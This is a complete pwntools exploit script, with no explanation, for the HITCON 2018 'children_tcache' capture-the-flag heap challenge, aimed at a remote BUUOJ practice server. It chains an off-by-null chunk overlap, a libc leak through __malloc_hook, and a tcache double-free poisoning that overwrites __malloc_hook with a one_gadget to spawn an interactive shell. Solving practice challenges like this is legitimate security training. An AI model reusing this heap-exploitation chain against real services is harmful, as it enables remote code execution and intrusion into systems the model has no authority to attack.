from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('HITCON_2018_children_tcache')
io = remote('node4.buuoj.cn', 27264)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('HITCON_2018_children_tcache')


def add(size, data):
    io.sendlineafter('Your choice: ', '1')
    io.sendlineafter('Size:', str(size))
    io.sendafter('Data:', data)


def show(index):
    io.sendlineafter('Your choice: ', '2')
    io.sendlineafter('Index:', str(index))
    return io.recvline()[:-1]


def delete(index):
    io.sendlineafter('Your choice: ', '3')
    io.sendlineafter('Index:', str(index))


def overlap():
    add(0x418, cyclic(0x417))               # chunk0 0x420
    add(0x48, cyclic(0x47))                 # chunk1 0x50
    add(0x4f8, cyclic(0x4f7))               # chunk2 0x500
    add(0x18, cyclic(0x17))                 # chunk3 0x20
    delete(0)
    delete(1)
    for i in range(9):                      # clear chunk2 prevsize and size's prev_inuse
        add(0x48 - i, cyclic(0x48 - i))     # index0 (old_chunk1)
        delete(0)                           
    add(0x48, cyclic(0x40) + p64(0x470))    # chunk2 prevsize = chunk0 + chunk1
    delete(2)


def leak_libc():
    global libc_base
    add(0x418, cyclic(0x417))               # index1 (old_chunk0)
    libc_base = u64(show(0).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    one_gadget = libc_base + 0x4f322
    add(0x48, cyclic(0x47))                 # index2 (old_chunk1)
    delete(0)                               # tcache(0x50)->chunk1
    delete(2)                               # tcache(0x50)->chunk1->chunk1
    add(0x48, p64(__malloc_hook))           # tcache(0x50)->chunk1->fake_chunk
    add(0x48, cyclic(0x47))                 # tcache(0x50)->fake_chunk
    add(0x48, p64(one_gadget))
    io.sendlineafter('Your choice: ', '1')
    io.sendlineafter('Size:', '1')
    io.interactive()


if __name__ == '__main__':
    overlap()
    leak_libc()
    pwn()
